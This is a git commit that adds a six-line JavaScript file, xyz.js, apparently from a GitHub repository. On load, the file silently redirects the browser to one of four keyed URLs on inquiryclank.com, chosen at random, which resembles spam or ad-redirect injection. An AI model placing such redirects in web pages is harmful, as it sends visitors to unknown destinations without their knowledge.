ce9076b9c68f29af690bdd13e7b70ef925cef140
movzen <90816406+movzen@users.noreply.github.com>
2021-10-22 15:03:31 +0800

    Create xyz.js

---
+++ xyz.js
@@ -0,0 +1,6 @@
+var dataUrl = [
+
+  'https://inquiryclank.com/pgy7h6cw?key=756a1bbb1d4d12b56cb50d97b90b7a51','https://inquiryclank.com/z5u26gw0i?key=afd8bed48a5de3937c8422b84862a994','https://inquiryclank.com/f2mnb80ep?key=c90b9940c19a9a3b1f8865dc628e8eca','https://inquiryclank.com/sgnfjfg1?key=cafae42abf7afad6a696828e19405747'
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
